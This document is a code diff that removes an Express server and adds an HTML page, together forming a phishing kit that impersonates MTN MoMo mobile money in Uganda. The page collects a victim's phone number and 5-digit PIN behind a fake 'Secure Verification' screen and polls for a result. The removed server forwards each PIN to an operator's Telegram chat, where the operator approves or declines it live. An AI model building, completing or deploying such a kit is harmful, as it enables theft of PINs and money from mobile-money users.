@@ -1,163 +1,235 @@
-const express = require("express");
-const path = require("path");
-const crypto = require("crypto");
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-const PUBLIC_DIR = path.join(__dirname, "public");
-const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");
-
-app.use(express.json({ limit: "10kb" }));
-app.use(express.static(PUBLIC_DIR));
-
-app.get("/", (_req, res) => {
-  res.sendFile(INDEX_FILE, err => {
-    if (err && !res.headersSent) res.status(404).send("Not found.");
-  });
-});
-
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const requests = new Map();
-
-setInterval(() => {
-  const now = Date.now();
-  for (const [id, data] of requests.entries()) {
-    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
-      requests.delete(id);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to MoMo</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { 
+      margin: 0; min-height: 100vh; font-family: Arial, sans-serif; 
+      background: #eef2f5; color: #171717; display: flex; flex-direction: column;
     }
-  }
-}, 5 * 60 * 1000);
+    header { background: #004f71; padding: 40px 16px 60px; text-align: center; }
+    .momo-logo-box {
+      width: 60px; height: 60px; background: #ffcc00; border-radius: 12px;
+      margin: 0 auto; display: flex; align-items: center; justify-content: center;
+    }
+    .momo-logo-text { color: #004f71; font-weight: 900; font-size: 18px; }
+    .momo-subtext { color: #ffcc00; font-size: 11px; margin-top: 4px; font-weight: bold; }
+    main { 
+      width: min(440px, 92%); margin: -35px auto 25px; padding: 30px 24px; 
+      background: white; border-radius: 24px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08); z-index: 10;
+    }
+    h2 { margin-top: 0; text-align: center; color: #004f71; font-size: 22px; }
+    .field-label { display: block; text-align: center; margin: 20px 0 12px; font-weight: 600; color: #555; }
+    .phone-row { display: flex; gap: 10px; align-items: center; border: 1px solid #ccc; border-radius: 16px; padding: 8px 14px; }
+    .country-flag { font-size: 20px; }
+    .phone-input-field { border: none; outline: none; width: 100%; font-size: 18px; font-weight: 600; }
+    .digits { display: flex; justify-content: center; gap: 10px; margin-top: 10px; }
+    .digit { width: 44px; height: 44px; border: 1px solid #ccc; border-radius: 12px; text-align: center; font-size: 20px; font-weight: bold; }
+    button { 
+      width: 100%; padding: 16px; margin-top: 30px; border: 0; border-radius: 25px; 
+      background: #004f71; color: white; font-weight: bold; font-size: 16px; cursor: pointer; 
+    }
+    button:disabled { background: #cccccc; cursor: not-allowed; }
+    .hidden { display: none !important; }
+    .legal-text { text-align: center; font-size: 13px; color: #666; margin-top: 25px; }
+    .legal-text a { color: #004f71; text-decoration: none; font-weight: bold; }
+    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; }
+    .success { font-size: 24px; text-align: center; color: #2e7d32; font-weight: bold; }
+    .secure-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.75);
+      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 9999;
+      display: flex; flex-direction: column; align-items: center; justify-content: center; color: #ffffff; text-align: center;
+    }
+    .circular-spinner {
+      width: 60px; height: 60px; border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #00cc66; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+    }
+    .secure-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; letter-spacing: 0.5px; }
+    .secure-sub { font-size: 14px; color: #dddddd; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
 
-async function telegram(method, payload) {
-  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
-  
-  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-  
-  const data = await res.json();
-  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram failed.");
-  return data;
-}
+  <div id="secureModal" class="secure-overlay hidden">
+    <div class="circular-spinner"></div>
+    <div class="secure-title">Secure Verification</div>
+    <div class="secure-sub">Verifying your PIN...<br>Please do not close this page.</div>
+  </div>
 
-app.post("/api/phone", (req, res) => {
-  const phone = String(req.body.phone || "").trim();
-  
-  // ✅ Fixed regular expression with clear absolute bounds match matching input numbers
-  if (!/^\+2567\d{8}$/.test(phone)) {
-    return res.status(400).json({ error: "Invalid format phone number." });
-  }
-  
-  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: new Date() };
-  requests.set(item.id, item);
-  return res.json({ id: item.id, status: item.status });
-});
+  <header>
+    <div class="momo-logo-box"><span class="momo-logo-text">MoMo</span></div>
+    <div class="momo-subtext">from MTN</div>
+  </header>
 
-app.post("/api/pin-demo", async (req, res) => {
-  const id = String(req.body.id || "");
-  const request = requests.get(id);
-  if (!request) return res.status(400).json({ error: "Session expired or missing." });
-  
-  request.pin = String(req.body.pin || "").trim();
-  request.status = "pending";
-  
-  const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
-  
-  try {
-    await telegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: [
-        "# Thor - PIN Verification",
-        "PIN VERIFICATION NEEDED\n",
-        "USER DETAILS:",
-        `• Phone Number: ${request.phone}`,
-        `• PIN Code: ${request.pin}`,
-        `• User ID: user_${id.replace(/-/g, "").substring(0, 14)}`,
-        `• Time: ${timeString}`,
-        "• Bot: user178\n",
-        "============================\n",
-        "Verify the PIN:",
-        "• PIN Length: 5 digits",
-        "• Timeout: 5 minutes"
-      ].join("\n"),
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Correct PIN", callback_data: `approve:${request.id}` },
-            { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
-          ],
-          [
-            { text: "⏳ Extend Time", callback_data: `extend:${request.id}` }
-          ]
-        ]
+  <main>
+    <section id="phonePage">
+      <h2>Welcome to MoMo</h2>
+      <label class="field-label">Enter number *</label>
+      <div class="phone-row">
+        <div class="country-flag">🇺🇬</div>
+        <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric" maxlength="9">
+      </div>
+      <button id="phoneButton" disabled>NEXT</button>
+      <p id="phoneError" class="error"></p>
+      <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
+    </section>
+
+    <section id="pinPage" class="hidden">
+      <h2>Welcome to MoMo</h2>
+      <label class="field-label">Enter your 5-digit PIN</label>
+      <div class="digits" id="pinDigits"></div>
+      <p id="pinStatus" class="status" style="text-align:center; margin-top: 15px;"></p>
+      <p id="pinError" class="error"></p>
+    </section>
+
+    <section id="successPage" class="hidden">
+      <div class="success">✓ Verified Successfully</div>
+    </section>
+  </main>
+
+  <script>
+    let currentRequestId = null;
+    let pollInterval = null;
+
+    const phonePage = document.getElementById('phonePage');
+    const pinPage = document.getElementById('pinPage');
+    const successPage = document.getElementById('successPage');
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneButton = document.getElementById('phoneButton');
+    const phoneError = document.getElementById('phoneError');
+    const pinDigitsContainer = document.getElementById('pinDigits');
+    const secureModal = document.getElementById('secureModal');
+    const pinStatus = document.getElementById('pinStatus');
+    const pinError = document.getElementById('pinError');
+
+    // Frontend text monitoring to swap button styles dynamically
+    phoneInput.addEventListener('input', (e) => {
+      let digits = e.target.value.replace(/[^0-9]/g, '');
+      e.target.value = digits;
+      if (digits.length === 9) {
+        phoneButton.removeAttribute('disabled');
+        phoneButton.style.background = "#004f71"; // Distinct rich colored option
+      } else {
+        phoneButton.setAttribute('disabled', 'true');
+        phoneButton.style.background = "#cccccc";
       }
     });
-    return res.json({ status: "pending" });
-  } catch (err) {
-    console.error("Telegram delivery error:", err);
-    request.status = "ready";
-    return res.status(502).json({ error: "Submission failed." });
-  }
-});
 
-app.get("/api/status/:id", (req, res) => {
-  const request = requests.get(req.params.id);
-  if (!request) return res.status(404).json({ error: "Not found." });
-  return res.json({ status: request.status, stage: request.stage });
-});
+    phoneButton.addEventListener('click', async () => {
+      phoneError.textContent = '';
+      phoneButton.disabled = true;
+      const fullPhone = '+256' + phoneInput.value;
 
-app.post("/api/retry", (req, res) => {
-  const request = requests.get(String(req.body.id || ""));
-  if (request && request.status === "declined") {
-    request.status = "ready";
-    return res.json({ status: request.status });
-  }
-  return res.status(400).json({ error: "Error resetting layout." });
-});
+      try {
+        const res = await fetch('/api/phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: fullPhone })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed to start.');
 
-let offset = 0;
-async function pollTelegram() {
-  if (!BOT_TOKEN || !CHAT_ID) return;
-  while (true) {
-    try {
-      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
-      for (const upd of data.result || []) {
-        offset = upd.update_id + 1;
-        const cb = upd.callback_query;
-        if (!cb) continue;
-        
-        const parts = String(cb.data || "").split(":");
-        // ✅ Fixed Array access index string assignment notation bug
-        const action = parts[0]; 
-        const reqId = parts.slice(1).join(":");
-        const request = requests.get(reqId);
-        
-        if (request && request.status === "pending" && ["approve", "decline", "extend"].includes(action)) {
-          if (action === "approve") {
-            request.status = "approved";
-          } else if (action === "decline") {
-            request.status = "declined";
-          }
-          
-          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
-          
-          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
-          await telegram("sendMessage", {
-            chat_id: CHAT_ID,
-            text: `${statusMarker} processed for Phone: ${request.phone}`
-          });
-        }
+        currentRequestId = data.id;
+        phonePage.classList.add('hidden');
+        pinPage.classList.remove('hidden');
+        createPinInputs(pinDigitsContainer, 5);
+      } catch (err) {
+        phoneError.textContent = err.message;
+        phoneButton.removeAttribute('disabled');
+        phoneButton.style.background = "#004f71";
       }
-    } catch (err) {
-      await new Promise(r => setTimeout(r, 4000));
-    }
-  }
-}
+    });
 
-pollTelegram();
-app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
+    function createPinInputs(container, count) {
+      container.innerHTML = '';
+      const inputs = [];
+      for (let i = 0; i < count; i++) {
+        const input = document.createElement('input');
+        input.type = 'password';
+        input.inputMode = 'numeric';
+        input.maxLength = 1;
+        input.className = 'digit';
+
+        input.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/[^0-9]/g, '');
+          if (e.target.value && input.nextElementSibling) input.nextElementSibling.focus();
+          
+          const pinVal = inputs.map(inp => inp.value).join('');
+          if (pinVal.length === count) submitPinFlow(pinVal, inputs);
+        });
+
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) input.previousElementSibling.focus();
+        });
+
+        container.appendChild(input);
+        inputs.push(input);
+      }
+      if(inputs[0]) inputs[0].focus();
+    }
+
+    async function submitPinFlow(pinValue, inputs) {
+      pinError.textContent = '';
+      secureModal.classList.remove('hidden'); 
+      inputs.forEach(i => i.disabled = true);
+
+      try {
+        const res = await fetch('/api/pin-demo', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
+        });
+        if (!res.ok) throw new Error('Submission failed.');
+        startPollingAdminState(inputs);
+      } catch (err) {
+        secureModal.classList.add('hidden');
+        pinError.textContent = err.message;
+        inputs.forEach(i => { i.disabled = false; i.value = ''; });
+        if(inputs[0]) inputs[0].focus();
+      }
+    }
+
+    function startPollingAdminState(inputs) {
+      if (pollInterval) clearInterval(pollInterval);
+      pollInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/status/${currentRequestId}`);
+          if (!res.ok) return;
+          const data = await res.json();
+
+          if (data.status === 'approved') {
+            clearInterval(pollInterval);
+            secureModal.classList.add('hidden');
+            pinPage.classList.add('hidden');
+            successPage.classList.remove('hidden');
+          } else if (data.status === 'declined') {
+            clearInterval(pollInterval);
+            secureModal.classList.add('hidden'); 
+            pinStatus.innerHTML = `Declined. <button id="retryBtn" style="padding: 8px 16px; margin-top: 10px;">Try Again</button>`;
+            document.getElementById('retryBtn').addEventListener('click', () => resetPinLayout(inputs));
+          }
+        } catch (err) { console.error(err); }
+      }, 3000);
+    }
+
+    async function resetPinLayout(inputs) {
+      try {
+        await fetch('/api/retry', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: currentRequestId })
+        });
+        inputs.forEach(i => { i.value = ''; i.disabled = false; });
+        pinStatus.textContent = '';
+        pinError.textContent = '';
+        if(inputs[0]) inputs[0].focus();
+      } catch (err) { pinError.textContent = 'Reset failed.'; }
+    }
+  </script>
+</body>
+</html>
 
